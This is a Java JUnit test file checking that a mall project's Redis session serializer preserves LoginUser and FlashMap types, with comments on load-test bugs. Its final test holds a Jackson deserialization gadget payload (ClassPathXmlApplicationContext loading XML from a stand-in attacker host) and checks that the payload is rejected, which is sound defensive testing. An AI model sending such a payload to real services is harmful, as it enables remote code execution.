package com.mall.session.config;

import com.mall.session.vo.LoginUser;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.data.redis.serializer.GenericJacksonJsonRedisSerializer;
import org.springframework.data.redis.serializer.RedisSerializer;
import org.springframework.data.redis.serializer.SerializationException;
import org.springframework.web.servlet.FlashMap;
import tools.jackson.databind.ObjectMapper;
import tools.jackson.databind.jsontype.BasicPolymorphicTypeValidator;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * 守住「会话里的对象读回来还是原来那个类型」。
 *
 * <h3>为什么必须有这条测试</h3>
 * 会话共享的整条链路只依赖一件事：{@code session.getAttribute("loginUser")} 读回来的
 * 东西是 {@link LoginUser}，而不是一个 {@code LinkedHashMap}。各服务的拦截器都写成
 * <pre>if (loginUser instanceof LoginUser) { ... }</pre>
 * 类型不对时它们<b>不会报错</b>，只是当成没登录。
 * <p>
 * 2026-08-27 压测时真的踩到了：Jackson 2 → 3 迁移把
 * {@code new GenericJackson2JsonRedisSerializer()}（无参构造，内部会开默认类型信息）
 * 换成了 {@code new GenericJacksonJsonRedisSerializer(new ObjectMapper())}
 * （裸 ObjectMapper，不开）。于是：
 * <ul>
 *   <li>编译通过；</li>
 *   <li>启动正常，没有任何异常日志；</li>
 *   <li>登录接口返回 302 跳转成功；</li>
 *   <li>Redis 里的 session 内容看起来完全正常；</li>
 *   <li>但每个需要登录态的请求都返回「请先登录」。</li>
 * </ul>
 * 全链路健康检查是绿的。管理后台走 JWT 不走 session，所以用真实浏览器验证后台
 * 登录时也没暴露出来。这就是这个仓库里反复出现的那类「编译干净、监控全绿、功能是坏的」。
 */
class MallSessionSerializerTest {

    private final MallSessionAutoConfiguration config = new MallSessionAutoConfiguration();

    @Test
    @DisplayName("生产配置的序列化器：LoginUser 往返之后仍然是 LoginUser")
    void productionSerializerPreservesType() {
        RedisSerializer<Object> serializer = config.springSessionDefaultRedisSerializer();

        LoginUser original = sample();
        byte[] bytes = serializer.serialize(original);
        Object restored = serializer.deserialize(bytes);

        // 这一条是全部要点。类型不对的话各服务的拦截器一律判定为未登录。
        assertThat(restored)
                .as("会话里的 LoginUser 读回来不是 LoginUser 了，所有需要登录态的接口都会返回「请先登录」")
                .isInstanceOf(LoginUser.class);
        assertThat((LoginUser) restored)
                .usingRecursiveComparison()
                .isEqualTo(original);
    }

    @Test
    @DisplayName("序列化结果里带类型信息，这是类型能还原的前提")
    void serializedFormCarriesTypeInformation() {
        RedisSerializer<Object> serializer = config.springSessionDefaultRedisSerializer();
        String json = new String(serializer.serialize(sample()), StandardCharsets.UTF_8);

        // 不写死 "@class" 这个字段名（它可以通过 typePropertyName 改），
        // 只要求类名出现在输出里 —— 那才是反序列化真正依赖的东西。
        assertThat(json)
                .as("序列化结果里没有类名，反序列化时 Jackson 无从知道该实例化什么: %s", json)
                .contains(LoginUser.class.getName());
    }

    @Test
    @DisplayName("阴性对照：裸 ObjectMapper 的序列化器【读不回】原类型")
    void bareObjectMapperLosesType() {
        // 这就是修复前的写法。留着它是为了证明上面两条断言【确实能发现这个错误】——
        // 否则「测试通过」可能只是因为断言太宽松，那种测试比没有更糟：
        // 它会让人以为这个风险已经被守住了。
        RedisSerializer<Object> broken = new GenericJacksonJsonRedisSerializer(new ObjectMapper());

        Object restored = broken.deserialize(broken.serialize(sample()));

        assertThat(restored)
                .as("裸 ObjectMapper 居然保留了类型信息 —— 那说明上面两条测试证明不了什么，需要重新设计")
                .isNotInstanceOf(LoginUser.class);
    }

    /**
     * Spring MVC 的 {@code addFlashAttribute} 会把 {@code List<FlashMap>} 存进会话
     * （SessionFlashMapManager 的 FLASH_MAPS 属性）。
     *
     * <p>2026-08-27 起白名单只放行 com.mall / java.*，FlashMap 不在里面：写得进去、读不回来。
     * 2026-09-29 压测时发现的后果：<b>输错一次密码，这个会话之后每个请求都 500</b>，
     * 直到会话过期（mall-auth 登录失败用 addFlashAttribute 回显错误）；结算页同理，
     * 任何一次下单失败（库存不足、价格变动、连接池超时）都会让用户的会话报废。
     * 回归脚本测了「错密码被拒绝」，但只看 Location 头，而那个 500 响应同样带着 Location。
     */
    @Test
    @DisplayName("会话里的 FlashMap（登录失败 / 下单失败回显）往返之后仍是 FlashMap，内容不丢")
    @SuppressWarnings("unchecked")
    void flashMapsSurviveTheRoundTrip() {
        RedisSerializer<Object> serializer = config.springSessionDefaultRedisSerializer();

        Object restored = serializer.deserialize(serializer.serialize(flashMaps()));

        assertThat(restored).isInstanceOf(List.class);
        List<?> list = (List<?>) restored;
        assertThat(list).hasSize(2).allMatch(FlashMap.class::isInstance);
        // FlashMap 同时是 Map 和 Comparable，assertThat 重载有歧义，按 Map 断言
        assertThat((Map<String, Object>) list.get(0)).containsEntry("errorCode", 3).containsEntry("errorMsg", "库存不足");
        assertThat((Map<String, Object>) list.get(1)).containsEntry("errors", Map.of("loginacct", "账号或密码错误"));
    }

    @Test
    @DisplayName("阴性对照：修复前的白名单读不回 FlashMap —— 证明上一条测得出这个 bug")
    void previousAllowListRejectsFlashMap() {
        RedisSerializer<Object> previous = GenericJacksonJsonRedisSerializer.builder()
                .enableDefaultTyping(BasicPolymorphicTypeValidator.builder()
                        .allowIfSubType("com.mall.").allowIfSubType("java.lang.")
                        .allowIfSubType("java.util.").allowIfSubType("java.time.").build())
                .build();
        byte[] bytes = previous.serialize(flashMaps());

        assertThatThrownBy(() -> previous.deserialize(bytes)).isInstanceOf(SerializationException.class)
                .hasMessageContaining("org.springframework.web.servlet.FlashMap");
    }

    @Test
    @DisplayName("放行 FlashMap 没有顺手放行整个 org.springframework：经典 gadget 类仍被拒绝")
    void otherSpringClassesAreStillRejected() {
        RedisSerializer<Object> serializer = config.springSessionDefaultRedisSerializer();
        String gadget = "{\"@class\":\"org.springframework.context.support.ClassPathXmlApplicationContext\","
                + "\"configLocation\":\"http://attacker.invalid/x.xml\"}";

        assertThatThrownBy(() -> serializer.deserialize(gadget.getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(SerializationException.class);
    }

    private static List<FlashMap> flashMaps() {
        FlashMap order = new FlashMap();
        order.put("errorCode", 3);
        order.put("errorMsg", "库存不足");
        FlashMap login = new FlashMap();
        login.put("errors", new HashMap<>(Map.of("loginacct", "账号或密码错误")));
        return new ArrayList<>(List.of(order, login));
    }

    private static LoginUser sample() {
        LoginUser user = new LoginUser();
        user.setId(8000001L);
        user.setUsername("lt0001");
        user.setNickname("压测会员1");
        user.setMobile("13908000001");
        user.setLevelId(null);
        user.setIcon(null);
        return user;
    }
}
